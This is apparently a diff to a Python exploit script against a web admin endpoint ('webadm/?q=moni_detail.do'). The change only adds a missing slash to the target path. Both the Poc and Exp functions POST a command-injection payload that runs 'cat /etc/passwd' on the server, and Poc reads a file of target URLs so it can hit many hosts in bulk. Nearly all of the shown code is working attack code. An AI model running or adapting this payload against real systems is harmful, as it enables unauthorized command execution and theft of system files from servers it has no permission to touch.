@@ -18,7 +18,7 @@ def Poc(filepath):
 	with open(str(filepath),"r") as f:
 		for url in f:
 			url = url.strip()
-			target = url + "webadm/?q=moni_detail.do&action=gragh"
+			target = url + "/webadm/?q=moni_detail.do&action=gragh"
 			data = "type=\'|cat /etc/passwd||\'"
 			try:
 				r = requests.post(url=target,headers=header,data=data,verify=False,timeout=8)
@@ -30,7 +30,7 @@ def Poc(filepath):
 				print("语法有误！")
 
 def Exp(url):
-	target = url + "webadm/?q=moni_detail.do&action=gragh"
+	target = url + "/webadm/?q=moni_detail.do&action=gragh"
 	data_poc = "type=\'|cat /etc/passwd||\'"
 	r = requests.post(url=target, data=data_poc, headers=header, timeout=8, verify=False)
 
